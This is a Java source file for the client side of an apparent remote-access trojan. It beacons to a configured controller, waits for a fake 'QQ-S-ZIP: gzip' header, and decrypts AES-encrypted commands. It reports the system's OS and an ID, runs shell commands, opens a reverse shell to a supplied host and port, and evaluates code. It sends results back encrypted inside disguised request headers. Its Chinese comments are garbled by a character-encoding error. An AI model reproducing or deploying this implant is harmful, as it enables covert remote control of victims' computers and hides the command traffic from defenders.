package socks;


import encryption.AESOperator;
import property.Property;
import exec.Call;

import java.io.*;
import java.net.Socket;
import java.util.UUID;

/**
 * �ͻ���
 */
public class Client {
    public void run() {
        //�����ɹ����ͻ�������Ψһ��ʶ
        String id = UUID.randomUUID().toString();
        System.out.println("����ID��".concat(id));

        Call ca = new Call();
        c:while (true) {
            String host = Property.host;
            int port = Property.port;
            Socket socket;
            try {
                socket = new Socket(host, port);
            } catch (IOException e) {
                //�������˶Ͽ���ÿ10����������һ�Ρ�
                System.out.println("�Ҳ�����������" + Property.reConnectTime/1000 + "����Զ���������...");
                try {
                    Thread.sleep(Property.reConnectTime);
                } catch (InterruptedException ex) {
                    ex.printStackTrace();
                }
                continue;
            }

            BufferedWriter os = null;
            BufferedReader is = null;
            try {
                //��Socket����õ��������������PrintWriter����
                os = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
                //��Socket����õ�����������������Ӧ��BufferedReader����
                is = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            } catch (IOException e) {
                //e.printStackTrace();
                System.out.println("�����������쳣��");
            }

            try {
                //����αװ����
                while (!"QQ-S-ZIP: gzip".equals(is.readLine())){
                }is.readLine();
                String recv = is.readLine();
                //���ݽ���
                try {
                    recv = AESOperator.getInstance().decrypt(recv);
                } catch (Exception e) {
                    System.err.println("���ܹ����쳣��");
                }

                String[] recvs = recv.split("#!#:#!#");
                String type = recvs[0];
                System.out.println("�յ�����:" + type);

                String cmd = "";
                if(recvs.length > 1){
                    cmd = recvs[1];
                    System.out.println("�յ�ָ��:" + cmd);
                }

                //��Զ�˷�������
                String data = "";
                if(type.equals("\\getInitInfo")){
                    data = "Ŀ��ϵͳ�汾��".concat(System.getProperty("os.name").concat("\r\nĿ��ID��").concat(id));
                } else if(type.equals("disconnect")){
                    if(cmd.equals("-1")){
                        System.out.println("shutdown");
                        break c;
                    }
                    Thread.sleep(1000 * Integer.parseInt(cmd));
                } else if (type.equals("cmd")) {
                    if(cmd == null || cmd.trim().equals("")){
                        System.out.println("cmdΪ��");
                    }else{
                        data = ca.execmd(cmd);
                    }
                } else if (type.equals("rshell")) {
                    String[] rShells = cmd.split(":");
                    if(cmd.indexOf(":") < 0){
                        rShells = cmd.split(" ");
                    }
                    String rShellHost = rShells[0];
                    int rShellPort = Integer.parseInt(rShells[1]);
                    System.out.println("ִ�з���shell��" + rShellHost.concat(":") + rShellPort);
                    ca.rShell(rShellHost, rShellPort);
                    data = "��ִ�з���shell��Ŀ��ϵͳ�汾��".concat(System.getProperty("os.name"));
                } else if (type.equals("eval")) {
                    if(cmd == null || cmd.trim().equals("")){
                        System.out.println("cmdΪ��");
                    }else{
                        data = ca.eval(cmd);
                    }
                }

                //���ݼ���
                try {
                    data = AESOperator.getInstance().encrypt(data);
                } catch (Exception e) {
                    System.out.println("���ܹ��̵����쳣��");
                }

                //αװ����
                BufferedReader in = new BufferedReader(new InputStreamReader(Property.class.getResourceAsStream("/conf/boxRequest.context")));
                String requestHeaders = "";
                String tmpStr;
                while ((tmpStr = in.readLine()) != null) {
                    requestHeaders += tmpStr + "\r\n";
                }
                requestHeaders = requestHeaders.substring(0,requestHeaders.lastIndexOf("\r\n"));
                in.close();
                data = requestHeaders.concat(data);

                os.write(data);
                os.newLine();
                os.flush();
                os.close();
                is.close();
                socket.close();
            } catch (IOException e) {
                System.err.println("��дԶ������ʱ�����쳣��");
            } catch (Exception e1) {
                e1.printStackTrace();
                System.err.println("δ֪�쳣��");
            }
        }

    }

}
